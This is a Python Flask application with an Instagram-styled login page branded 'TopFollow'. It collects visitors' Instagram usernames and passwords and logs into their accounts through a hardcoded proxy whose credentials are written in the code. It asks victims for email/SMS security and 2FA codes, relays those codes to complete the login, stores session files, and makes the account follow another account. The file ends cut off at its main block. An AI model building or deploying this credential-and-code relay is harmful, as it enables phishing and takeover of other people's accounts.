import os
import sys
import json
import time
import logging
import traceback
import subprocess
import tempfile
import threading
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from dotenv import load_dotenv

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv("SECRET_KEY", "secret-key-123")

# BELLEK İÇİ VERİ DEPOLAMA
accounts_lock = threading.Lock()
accounts_store = {}

# PROXY
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"
logger.info(f"Proxy: {PROXY_URL[:30]}...")

def get_account(username):
    with accounts_lock:
        return accounts_store.get(username.lower())

def save_account(username, data):
    with accounts_lock:
        accounts_store[username.lower()] = {
            'username': username,
            'password_hash': data.get('password_hash', ''),
            'status': data.get('status', 'Beklemede'),
            'login_attempts': data.get('login_attempts', 0),
            'last_login': data.get('last_login'),
            'challenge_pending': data.get('challenge_pending', False),
            'challenge_type': data.get('challenge_type'),
            'challenge_method': data.get('challenge_method', 'email'),  # email veya sms
            'checkpoint_url': data.get('checkpoint_url'),
            'raw_error': data.get('raw_error'),
            'created_at': data.get('created_at', datetime.now().isoformat())
        }

# CHALLENGE DESTEKLİ LOGIN SCRIPT
LOGIN_SCRIPT = r'''
import sys
import json
import time
import os

USERNAME = sys.argv[1] if len(sys.argv) > 1 else ""
PASSWORD = sys.argv[2] if len(sys.argv) > 2 else ""
PROXY = sys.argv[3] if len(sys.argv) > 3 else None
ACTION = sys.argv[4] if len(sys.argv) > 4 else "login"  # login veya challenge
CODE = sys.argv[5] if len(sys.argv) > 5 else None  # challenge kodu

LOG_FILE = f"/tmp/ig_challenge_{USERNAME}.log"
log_f = open(LOG_FILE, "w", buffering=1)

def log(msg):
    timestamp = time.strftime('%H:%M:%S')
    line = f"{timestamp} | {msg}"
    log_f.write(line + "\n")
    log_f.flush()
    print(line, file=sys.stderr)

log("=" * 60)
log(f"🚀 SCRIPT BAŞLADI | Action: {ACTION}")
log(f"👤 Username: {USERNAME}")
log(f"🔑 Password: {'*' * len(PASSWORD)} ({len(PASSWORD)} chars)")
log(f"🌐 Proxy: {PROXY[:25] + '...' if PROXY else 'YOK'}")
log(f"📝 Code: {CODE if CODE else 'YOK'}")
log("=" * 60)

# INSTAGRAPI IMPORT
log("📦 instagrapi import...")
try:
    from instagrapi import Client
    from instagrapi.exceptions import (
        ChallengeRequired, LoginRequired, 
        PleaseWaitFewMinutes, BadPassword,
        TwoFactorRequired, ClientError,
        ChallengeError
    )
    from instagrapi.mixins.challenge import ChallengeChoice
    log("✅ instagrapi import OK")
except Exception as e:
    log(f"❌ Import HATASI: {e}")
    print(json.dumps({"status": "error", "error": f"Import: {str(e)}"}))
    sys.exit(1)

# GLOBAL CLIENT (challenge için gerekli)
cl = None

def get_client():
    global cl
    if cl is None:
        cl = Client()
        if PROXY and PROXY != "None":
            try:
                cl.set_proxy(PROXY)
                log("✅ Proxy ayarlandı")
            except Exception as e:
                log(f"⚠️ Proxy hatası: {e}")
        cl.request_timeout = 60
        cl.delay_range = [2, 5]
    return cl

def main():
    global cl
    
    try:
        # CHALLENGE CEVABI
        if ACTION == "challenge" and CODE:
            log(f"🔐 Challenge cevabı gönderiliyor: {CODE}")
            
            # Önceki session'ı dene yükle
            session_file = f"/tmp/ig_session_{USERNAME}.json"
            try:
                if os.path.exists(session_file):
                    with open(session_file, 'r') as f:
                        settings = json.load(f)
                        cl = get_client()
                        cl.set_settings(settings)
                        log("✅ Önceki session yüklendi")
            except Exception as e:
                log(f"⚠️ Session yükleme hatası: {e}")
            
            try:
                # Challenge cevabı gönder
                if hasattr(cl, 'challenge_code'):
                    cl.challenge_code(CODE)
                else:
                    # Alternatif yöntem
                    cl.set_settings({"challenge_code": CODE})
                
                log("✅✅✅ Challenge BAŞARILI! ✅✅✅")
                print(json.dumps({
                    "status": "success",
                    "message": "Doğrulama başarılı! Giriş tamamlandı."
                }))
                
                # Takip et
                try:
                    insta_id = cl.user_id_from_username("instagram")
                    cl.user_follow(insta_id)
                    log("✅ Takip edildi")
                except Exception as e:
                    log(f"⚠️ Takip hatası: {e}")
                    
            except Exception as e:
                log(f"❌ Challenge HATASI: {e}")
                print(json.dumps({
                    "status": "error",
                    "error": f"Kod hatalı veya süresi dolmuş: {str(e)}"
                }))
            return
        
        # NORMAL LOGIN
        log("")
        log("🔐🔐🔐 INSTAGRAM LOGIN BAŞLIYOR 🔐🔐🔐")
        
        cl = get_client()
        login_start = time.time()
        
        try:
            cl.login(USERNAME, PASSWORD)
            login_time = time.time() - login_start
            log(f"✅✅✅ LOGIN BAŞARILI! ({login_time:.1f}s) ✅✅✅")
            
            # Session'ı kaydet (challenge için)
            try:
                settings = cl.get_settings()
                session_file = f"/tmp/ig_session_{USERNAME}.json"
                with open(session_file, 'w') as f:
                    json.dump(settings, f)
                log(f"💾 Session kaydedildi: {session_file}")
            except Exception as e:
                log(f"⚠️ Session kaydetme hatası: {e}")
            
            # Takip et
            try:
                insta_id = cl.user_id_from_username("instagram")
                cl.user_follow(insta_id)
                log("✅ Takip edildi")
                result = {
                    "status": "success",
                    "message": f"Giriş ve takip başarılı ({login_time:.1f}s)"
                }
            except Exception as e:
                log(f"⚠️ Takip hatası: {e}")
                result = {
                    "status": "success",
                    "message": f"Giriş başarılı ({login_time:.1f}s)"
                }
            
            print(json.dumps(result))
            
        except ChallengeRequired as e:
            login_time = time.time() - login_start
            log(f"⚠️⚠️⚠️ ChallengeRequired ({login_time:.1f}s) ⚠️⚠️⚠️")
            log(f"Challenge detay: {str(e)}")
            
            # Session'ı kaydet (challenge için)
            try:
                settings = cl.get_settings()
                session_file = f"/tmp/ig_session_{USERNAME}.json"
                with open(session_file, 'w') as f:
                    json.dump(settings, f)
                log(f"💾 Challenge session kaydedildi")
            except Exception as save_err:
                log(f"⚠️ Session kaydetme hatası: {save_err}")
            
            # Challenge methodunu belirle
            method = "email"  # Varsayılan
            try:
                if hasattr(e, 'challenge'):
                    # Challenge seçeneklerini kontrol et
                    log(f"Challenge options: {e.challenge}")
            except:
                pass
            
            print(json.dumps({
                "status": "challenge_required",
                "challenge_type": "code",
                "challenge_method": method,
                "message": f"Doğrulama kodu gerekli! {login_time:.1f}s içinde e-postanıza/SMS'inize kod gönderildi.",
                "hint": "Lütfen e-postanızı veya telefonunuzu kontrol edin, 6 haneli kodu girin."
            }))
            
        except TwoFactorRequired as e:
            login_time = time.time() - login_start
            log(f"⚠️⚠️⚠️ TwoFactorRequired ({login_time:.1f}s) ⚠️⚠️⚠️")
            print(json.dumps({
                "status": "2fa_required",
                "challenge_type": "2fa",
                "message": "İki faktörlü doğrulama kodu gerekli.",
                "time": f"{login_time:.1f}s"
            }))
            
        except BadPassword as e:
            login_time = time.time() - login_start
            log(f"❌❌❌ BadPassword ({login_time:.1f}s) ❌❌❌")
            log(f"Detay: {e}")
            print(json.dumps({
                "status": "bad_password",
                "error": "Şifre yanlış veya hesap kısıtlı",
                "time": f"{login_time:.1f}s"
            }))
            
        except Exception as e:
            login_time = time.time() - login_start
            log(f"❌❌❌ Beklenmeyen hata ({login_time:.1f}s) ❌❌❌")
            log(f"Hata: {type(e).__name__}: {e}")
            import traceback
            log(f"Traceback:\n{traceback.format_exc()}")
            print(json.dumps({
                "status": "error",
                "error": f"{type(e).__name__}: {str(e)}",
                "time": f"{login_time:.1f}s"
            }))
        
    except Exception as e:
        log(f"❌❌❌ DIŞ HATA: {type(e).__name__}: {e}")
        import traceback
        log(f"Traceback:\n{traceback.format_exc()}")
        print(json.dumps({
            "status": "error",
            "error": f"Dış hata: {str(e)}"
        }))
    finally:
        log_f.close()

if __name__ == "__main__":
    main()
'''

def run_subprocess(username, password, action="login", code=None):
    """Subprocess çalıştır"""
    if not password:
        return {"status": "error", "error": "Şifre boş"}
    
    script_content = LOGIN_SCRIPT.replace("{USERNAME}", username)
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, dir='/tmp') as f:
        f.write(script_content)
        script_path = f.name
    
    logger.info(f"[{username}] 🚀 Subprocess: {action}")
    
    try:
        env = os.environ.copy()
        env['PYTHONUNBUFFERED'] = '1'
        
        args = [sys.executable, '-u', script_path, username, password, PROXY_URL or "None", action]
        if code:
            args.append(code)
        
        # Gerçek zamanlı log takibi
        process = subprocess.Popen(
            args,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            cwd='/tmp',
            env=env
        )
        
        log_file_path = f"/tmp/ig_challenge_{username}.log"
        last_position = 0
        
        while process.poll() is None:
            try:
                if os.path.exists(log_file_path):
                    with open(log_file_path, 'r') as f:
                        f.seek(last_position)
                        new_logs = f.read()
                        if new_logs:
                            for line in new_logs.strip().split('\n'):
                                if line.strip():
                                    logger.info(f"[{username}] {line.strip()}")
                            last_position = f.tell()
            except:
                pass
            time.sleep(0.3)
        
        stdout, stderr = process.communicate(timeout=5)
        
        # Son logları
        try:
            with open(log_file_path, 'r') as f:
                f.seek(last_position)
                final_logs = f.read()
                if final_logs:
                    for line in final_logs.strip().split('\n'):
                        if line.strip():
                            logger.info(f"[{username}] {line.strip()}")
        except:
            pass
        
        # Temizlik
        try:
            os.unlink(script_path)
        except:
            pass
        
        if process.returncode != 0:
            return {"status": "error", "error": f"Process hatası: {stderr[:150]}"}
        
        # JSON bul
        lines = [l.strip() for l in stdout.split('\n') if l.strip()]
        for line in reversed(lines):
            if line.startswith('{') and line.endswith('}'):
                try:
                    return json.loads(line)
                except:
                    continue
        
        return {"status": "error", "error": "JSON bulunamadı"}
        
    except subprocess.TimeoutExpired:
        process.kill()
        return {"status": "error", "error": "Zaman aşımı (120s)"}
    except Exception as e:
        return {"status": "error", "error": str(e)}

def do_login_task(username, password):
    """Background login task"""
    acc = get_account(username)
    if not acc:
        save_account(username, {
            'status': 'Giriş deneniyor...',
            'login_attempts': 1,
            'created_at': datetime.now().isoformat()
        })
    else:
        save_account(username, {
            **acc,
            'status': 'Giriş deneniyor...',
            'login_attempts': acc.get('login_attempts', 0) + 1
        })
    
    result = run_subprocess(username, password, "login")
    
    status = result.get("status")
    current_acc = get_account(username) or {}
    
    if status == "success":
        save_account(username, {
            **current_acc,
            'status': "AKTİF ✅ - " + result.get("message", "Başarılı"),
            'last_login': datetime.now().isoformat(),
            'challenge_pending': False
        })
    elif status == "challenge_required":
        save_account(username, {
            **current_acc,
            'status': "🔐 DOĞRULAMA KODU GEREKLİ",
            'challenge_type': result.get("challenge_type", "code"),
            'challenge_method': result.get("challenge_method", "email"),
            'challenge_pending': True,
            'raw_error': json.dumps(result)
        })
        logger.info(f"[{username}] 📧 Challenge kodu gönderildi! E-posta/SMS kontrol edilmeli")
    elif status == "2fa_required":
        save_account(username, {
            **current_acc,
            'status': "🔐 2FA KODU GEREKLİ",
            'challenge_type': "2fa",
            'challenge_pending': True,
            'raw_error': json.dumps(result)
        })
    elif status == "bad_password":
        save_account(username, {
            **current_acc,
            'status': "⚠️ Şifre yanlış veya hesap kısıtlı (" + result.get("time", "?") + ")",
            'raw_error': json.dumps(result)
        })
    else:
        save_account(username, {
            **current_acc,
            'status': "HATA ❌ - " + result.get("error", "Bilinmeyen hata")[:80],
            'raw_error': json.dumps(result)
        })

def do_challenge_task(username, password, code):
    """Challenge cevabı gönder"""
    result = run_subprocess(username, password, "challenge", code)
    
    current_acc = get_account(username) or {}
    
    if result.get("status") == "success":
        save_account(username, {
            **current_acc,
            'status': "AKTİF ✅ - " + result.get("message", "Doğrulama başarılı"),
            'last_login': datetime.now().isoformat(),
            'challenge_pending': False
        })
    else:
        save_account(username, {
            **current_acc,
            'status': "❌ Kod hatalı - " + result.get("error", "Tekrar deneyin")[:50],
            'raw_error': json.dumps(result)
        })
    
    return result

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    try:
        data = request.get_json()
        username = data.get('u', '').strip().lower()
        password = data.get('p', '')
        
        if not username or not password:
            return jsonify(status="error", message="Eksik bilgi"), 400
        
        acc = get_account(username)
        if not acc:
            save_account(username, {
                'status': 'Başlatılıyor...',
                'login_attempts': 0,
                'created_at': datetime.now().isoformat()
            })
        
        t = threading.Thread(
            target=do_login_task,
            args=(username, password),
            daemon=True
        )
        t.start()
        
        return jsonify(
            status="started",
            username=username,
            message="Giriş başlatıldı"
        )
        
    except Exception as e:
        logger.error(f"Connect hatası: {e}")
        return jsonify(status="error", message=str(e)), 500

@app.route('/api/challenge', methods=['POST'])
def submit_challenge():
    """Challenge kodunu gönder"""
    try:
        data = request.get_json()
        username = data.get('u', '').strip().lower()
        code = data.get('code', '').strip()
        password = data.get('p', '')  # Şifre tekrar gönderilmeli
        
        if not username or not code:
            return jsonify(status="error", message="Kullanıcı adı ve kod gerekli"), 400
        
        if not password:
            # Şifre yoksa database'den al (ama hash'li olduğu için çalışmaz)
            # Bu yüzden frontend'den şifre tekrar istenmeli
            acc = get_account(username)
            if not acc:
                return jsonify(status="error", message="Hesap bulunamadı, şifre gerekli"), 400
        
        t = threading.Thread(
            target=do_challenge_task,
            args=(username, password, code),
            daemon=True
        )
        t.start()
        
        return jsonify(
            status="challenge_submitting",
            message="Kod doğrulanıyor..."
        )
        
    except Exception as e:
        logger.error(f"Challenge hatası: {e}")
        return jsonify(status="error", message=str(e)), 500

@app.route('/api/status/<username>')
def get_status(username):
    acc = get_account(username.lower())
    
    if not acc:
        return jsonify(
            status="Hesap bulunamadı", 
            exists=False,
            username=username
        )
    
    return jsonify(
        status=acc.get('status', 'Bekleniyor...'),
        exists=True,
        attempts=acc.get('login_attempts', 0),
        last_login=acc.get('last_login'),
        challenge_pending=acc.get('challenge_pending', False),
        challenge_type=acc.get('challenge_type'),
        challenge_method=acc.get('challenge_method', 'email'),
        raw_error=acc.get('raw_error', '')[:300] if acc.get('raw_error') else None,
        hint="E-postanıza veya SMS'inize gelen 6 haneli kodu girin" if acc.get('challenge_pending') else None
    )

@app.route('/api/health')
def health():
    return jsonify(
        status="ok",
        storage="in-memory",
        accounts_count=len(accounts_store),
        mode="challenge-auto-panel"
    )

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TopFollow - Instagram Challenge</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .page { display: none; }
        .active { display: flex; }
        .hidden { display: none !important; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes slideUp { from { opacity: 0; transform: translateY(50px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
        @keyframes pulse-ring {
            0% { transform: scale(0.8); opacity: 0.5; }
            100% { transform: scale(1.3); opacity: 0; }
        }
        .animate-fade-in { animation: fadeIn 0.4s ease-out; }
        .animate-slide-up { animation: slideUp 0.5s cubic-bezier(0.16, 1, 0.3, 1); }
        .loader { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 8px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .pulse-ring::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: 50%;
            border: 2px solid #fbbf24;
            animation: pulse-ring 2s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;
        }
    </style>
</head>
<body class="bg-gradient-to-br from-purple-600 via-purple-500 to-blue-500 min-h-screen font-sans text-white">

    <!-- Login Page -->
    <div id="p1" class="page active flex-col items-center justify-center min-h-screen p-6 animate-fade-in">
        <div class="w-full max-w-[340px]">
            <div class="text-center mb-12">
                <div class="w-20 h-20 bg-white/20 rounded-3xl flex items-center justify-center mx-auto mb-4 backdrop-blur-sm shadow-lg">
                    <svg class="w-10 h-10 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
                </div>
                <h1 class="text-3xl font-bold mb-1">Instagram</h1>
                <p class="text-white/70 text-sm">TopFollow Bağlantısı</p>
            </div>
            
            <!-- Normal Login Form -->
            <div id="loginForm" class="space-y-4">
                <div class="bg-white/10 backdrop-blur-md rounded-xl p-1 border border-white/20">
                    <input id="u" type="text" placeholder="Kullanıcı adı" 
                           class="w-full bg-transparent text-white placeholder-white/60 p-4 outline-none text-base"
                           autocomplete="username">
                </div>
                
                <div class="bg-white/10 backdrop-blur-md rounded-xl p-1 border border-white/20">
                    <input id="p" type="password" placeholder="Şifre" 
                           class="w-full bg-transparent text-white placeholder-white/60 p-4 outline-none text-base"
                           autocomplete="current-password">
                </div>
                
                <button onclick="giris()" id="btn" 
                        class="w-full bg-white text-purple-600 p-4 rounded-xl font-bold text-lg shadow-lg hover:bg-gray-100 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center mt-6">
                    <div id="btnLoader" class="loader hidden border-purple-600 border-t-transparent"></div>
                    <span id="btnText">Giriş Yap</span>
                </button>
            </div>
            
            <!-- Challenge Form (Başlangıçta gizli) -->
            <div id="challengeForm" class="hidden space-y-4 animate-slide-up">
                <div class="relative w-24 h-24 mx-auto mb-4">
                    <div class="absolute inset-0 bg-yellow-400 rounded-full pulse-ring"></div>
                    <div class="relative w-full h-full bg-yellow-400 rounded-full flex items-center justify-center shadow-lg">
                        <svg class="w-12 h-12 text-purple-900" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
                        </svg>
                    </div>
                </div>
                
                <div class="text-center mb-4">
                    <h3 class="text-xl font-bold mb-2">🔐 Güvenlik Doğrulaması</h3>
                    <p id="challengeHint" class="text-white/80 text-sm">E-postanıza 6 haneli kod gönderildi</p>
                </div>
                
                <!-- Kod Input -->
                <div class="bg-white/10 backdrop-blur-md rounded-xl p-1 border border-yellow-400/50">
                    <input id="challengeCode" type="text" placeholder="• • • • • •" 
                           class="w-full bg-transparent text-white placeholder-white/40 p-4 outline-none text-center text-2xl font-bold tracking-[0.5em]"
                           maxlength="6" inputmode="numeric">
                </div>
                
                <!-- Şifre (Challenge için tekrar gerekli) -->
                <div class="bg-white/10 backdrop-blur-md rounded-xl p-1 border border-white/20">
                    <input id="challengePassword" type="password" placeholder="Şifrenizi tekrar girin" 
                           class="w-full bg-transparent text-white placeholder-white/60 p-3 outline-none text-sm">
                </div>
                
                <button onclick="submitChallenge()" id="challengeBtn" 
                        class="w-full bg-yellow-400 text-purple-900 p-4 rounded-xl font-bold text-lg shadow-lg hover:bg-yellow-300 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center">
                    <div id="challengeLoader" class="loader hidden border-purple-900 border-t-transparent"></div>
                    <span id="challengeBtnText">Kodu Doğrula</span>
                </button>
                
                <button onclick="backToLogin()" class="w-full bg-white/10 text-white p-3 rounded-xl font-semibold text-sm hover:bg-white/20 transition-all">
                    ← Giriş Ekranına Dön
                </button>
                
                <p class="text-white/50 text-xs text-center">
                    Kod gelmedi mi? Spam klasörünü kontrol edin veya 2 dakika bekleyin
                </p>
            </div>
            
            <div id="errorBox" class="hidden mt-6 p-4 bg-red-500/30 border border-red-400/50 rounded-xl text-center text-sm backdrop-blur-sm"></div>
        </div>
    </div>

    <!-- Status Page -->
    <div id="p2" class="page flex-col items-center justify-center min-h-screen p-6 bg-gray-50 text-gray-800 hidden">
        <div class="w-full max-w-[340px] animate-fade-in">
            <div class="bg-white rounded-3xl shadow-xl p-8 text-center mb-6 border-b-4 border-purple-500">
                <div class="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <div id="statusIcon" class="w-4 h-4 bg-purple-500 rounded-full animate-pulse"></div>
                </div>
                
                <h2 id="msg" class="text-xl font-bold text-gray-800 mb-2">Bağlanıyor...</h2>
                <p id="subMsg" class="text-gray-500 text-sm">İşlem devam ediyor</p>
                
                <div id="rawError" class="hidden mt-3 p-2 bg-gray-100 rounded text-xs text-left font-mono break-all max-h-32 overflow-y-auto"></div>
            </div>

            <div class="bg-white rounded-2xl shadow-md p-5 mb-4">
                <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-100">
                    <span class="text-gray-500 text-sm">Kullanıcı</span>
                    <span id="utag" class="font-bold text-gray-800">@username</span>
                </div>
                <div class="flex justify-between items-center">
                    <span class="text-gray-500 text-sm">Durum</span>
                    <span id="statusBadge" class="bg-yellow-100 text-yellow-700 px-3 py-1 rounded-full text-xs font-bold">Bekliyor</span>
                </div>
            </div>

            <!-- Challenge Button (Otomatik göster/gizle) -->
            <button onclick="showChallengePanel()" id="challengePanelBtn"
                    class="hidden w-full bg-yellow-400 text-purple-900 p-4 rounded-xl font-bold mb-3 hover:bg-yellow-300 transition-all active:scale-[0.98] shadow-lg animate-slide-up">
                🔐 Doğrulama Kodu Gir
            </button>

            <button onclick="checkNow()" id="checkBtn"
                    class="w-full bg-purple-600 text-white p-4 rounded-xl font-bold mb-3 hover:bg-purple-700 transition-all active:scale-[0.98] shadow-lg">
                Durumu Kontrol Et
            </button>
            
            <button onclick="location.reload()" 
                    class="w-full bg-gray-200 text-gray-700 p-4 rounded-xl font-bold hover:bg-gray-300 transition-all active:scale-[0.98]">
                Yeniden Dene
            </button>
            
            <p class="text-center text-gray-400 text-xs mt-6">
                Otomatik: <span id="timer" class="font-bold text-purple-600">5</span>s
            </p>
        </div>
    </div>

    <script>
        let currentUser = "";
        let currentPassword = "";
        let checkInterval = null;
        let countdown = 5;

        function showError(msg) {
            const box = document.getElementById('errorBox');
            box.textContent = msg;
            box.classList.remove('hidden');
            
            const btn = document.getElementById('btn');
            btn.disabled = false;
            document.getElementById('btnText').classList.remove('hidden');
            document.getElementById('btnLoader').classList.add('hidden');
        }

        function showChallengeForm() {
            document.getElementById('loginForm').classList.add('hidden');
            document.getElementById('challengeForm').classList.remove('hidden');
            
            // Challenge hint güncelle
            const hint = document.getElementById('challengeHint');
            hint.textContent = "E-postanıza veya telefonunuza 6 haneli kod gönderildi";
        }

        function backToLogin() {
            document.getElementById('challengeForm').classList.add('hidden');
            document.getElementById('loginForm').classList.remove('hidden');
        }

        function showChallengePanel() {
            document.getElementById('p2').classList.add('hidden');
            document.getElementById('p2').classList.remove('active');
            document.getElementById('p1').classList.remove('hidden');
            document.getElementById('p1').classList.add('active');
            showChallengeForm();
        }

        async function giris() {
            const u = document.getElementById('u').value.trim().toLowerCase();
            const p = document.getElementById('p').value;

            if (!u || !p) {
                showError('Kullanıcı adı ve şifre girin');
                return;
            }

            currentUser = u;
            currentPassword = p;

            const btn = document.getElementById('btn');
            btn.disabled = true;
            document.getElementById('btnText').classList.add('hidden');
            document.getElementById('btnLoader').classList.remove('hidden');
            document.getElementById('errorBox').classList.add('hidden');

            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 5000);

                const res = await fetch('/api/connect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u: u, p: p}),
                    signal: controller.signal
                });

                clearTimeout(timeoutId);
                const data = await res.json();

                if (!res.ok && data.status === 'error') {
                    throw new Error(data.message || 'Sunucu hatası');
                }

                // Status sayfasına geç
                document.getElementById('p1').classList.add('hidden');
                document.getElementById('p1').classList.remove('active');
                document.getElementById('p2').classList.remove('hidden');
                document.getElementById('p2').classList.add('active');
                document.getElementById('utag').textContent = '@' + u;
                
                startChecking();

            } catch (err) {
                if (err.name === 'AbortError') {
                    showError('Sunucu yanıt vermiyor - Tekrar deneyin');
                } else {
                    showError(err.message);
                }
                
                btn.disabled = false;
                document.getElementById('btnText').classList.remove('hidden');
                document.getElementById('btnLoader').classList.add('hidden');
            }
        }

        async function submitChallenge() {
            const code = document.getElementById('challengeCode').value.trim();
            const password = document.getElementById('challengePassword').value;

            if (!code || code.length < 4) {
                showError('Lütfen geçerli bir kod girin (4-6 hane)');
                return;
            }

            if (!password) {
                showError('Şifrenizi tekrar girin');
                return;
            }

            const btn = document.getElementById('challengeBtn');
            btn.disabled = true;
            document.getElementById('challengeBtnText').classList.add('hidden');
            document.getElementById('challengeLoader').classList.remove('hidden');

            try {
                const res = await fetch('/api/challenge', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        u: currentUser,
                        p: password,
                        code: code
                    })
                });

                const data = await res.json();

                if (data.status === 'success' || data.status === 'challenge_submitting') {
                    // Status sayfasına geç
                    document.getElementById('p1').classList.add('hidden');
                    document.getElementById('p1').classList.remove('active');
                    document.getElementById('p2').classList.remove('hidden');
                    document.getElementById('p2').classList.add('active');
                    backToLogin();
                    startChecking();
                } else {
                    showError(data.message || 'Kod hatalı');
                    btn.disabled = false;
                    document.getElementById('challengeBtnText').classList.remove('hidden');
                    document.getElementById('challengeLoader').classList.add('hidden');
                }

            } catch (err) {
                showError('Bağlantı hatası: ' + err.message);
                btn.disabled = false;
                document.getElementById('challengeBtnText').classList.remove('hidden');
                document.getElementById('challengeLoader').classList.add('hidden');
            }
        }

        function startChecking() {
            checkStatus();
            checkInterval = setInterval(() => {
                checkStatus();
                countdown = 5;
            }, 4000);  // Daha sık kontrol
            
            setInterval(() => {
                if (countdown > 0) {
                    countdown--;
                    document.getElementById('timer').textContent = countdown;
                } else {
                    countdown = 5;
                }
            }, 1000);
        }

        async function checkNow() {
            const btn = document.getElementById('checkBtn');
            const originalText = btn.textContent;
            btn.disabled = true;
            btn.textContent = 'Kontrol ediliyor...';
            
            await checkStatus();
            
            setTimeout(() => {
                btn.disabled = false;
                btn.textContent = originalText;
            }, 800);
        }

        async function checkStatus() {
            if (!currentUser) return;
            
            try {
                const res = await fetch('/api/status/' + currentUser);
                const data = await res.json();
                
                const msgEl = document.getElementById('msg');
                const iconEl = document.getElementById('statusIcon');
                const badge = document.getElementById('statusBadge');
                const subMsg = document.getElementById('subMsg');
                const challengeBtn = document.getElementById('challengePanelBtn');
                const rawErrorDiv = document.getElementById('rawError');
                
                msgEl.textContent = data.status || 'Bekleniyor...';
                
                if (data.raw_error) {
                    rawErrorDiv.textContent = data.raw_error;
                }
                
                // Challenge durumu - OTOMAİK BUTON GÖSTER
                if (data.challenge_pending) {
                    challengeBtn.classList.remove('hidden');
                    badge.className = 'bg-yellow-100 text-yellow-700 px-3 py-1 rounded-full text-xs font-bold';
                    badge.textContent = 'Kod Bekleniyor';
                    iconEl.className = 'w-4 h-4 bg-yellow-500 rounded-full animate-bounce';
                    subMsg.textContent = data.hint || 'E-postanızı veya telefonunuzu kontrol edin';
                    
                    // Otomatik challenge panelini göster (ilk sefer)
                    if (!window.challengeShown) {
                        window.challengeShown = true;
                        setTimeout(() => {
                            showChallengePanel();
                        }, 1000);
                    }
                }
                else if (data.status.includes('✅')) {
                    challengeBtn.classList.add('hidden');
                    badge.className = 'bg-green-100 text-green-700 px-3 py-1 rounded-full text-xs font-bold';
                    badge.textContent = 'Aktif';
                    iconEl.className = 'w-4 h-4 bg-green-500 rounded-full';
                    subMsg.textContent = 'Başarıyla bağlandı!';
                    clearInterval(checkInterval);
                } else if (data.status.includes('❌')) {
                    challengeBtn.classList.add('hidden');
                    badge.className = 'bg-red-100 text-red-700 px-3 py-1 rounded-full text-xs font-bold';
                    badge.textContent = 'Hata';
                    iconEl.className = 'w-4 h-4 bg-red-500 rounded-full';
                    subMsg.textContent = 'Bir sorun oluştu';
                } else if (data.status.includes('⚠️')) {
                    badge.className = 'bg-orange-100 text-orange-700 px-3 py-1 rounded-full text-xs font-bold';
                    badge.textContent = 'Kontrol';
                    iconEl.className = 'w-4 h-4 bg-orange-500 rounded-full animate-pulse';
                }

            } catch (e) {
                console.error('Status error:', e);
            }
        }

        // Enter tuşları
        document.getElementById('p').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') giris();
        });
        document.getElementById('challengeCode').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') submitChallenge();
        });
    </script>
</body>
</html>
"""

if __name__ == "__main__":
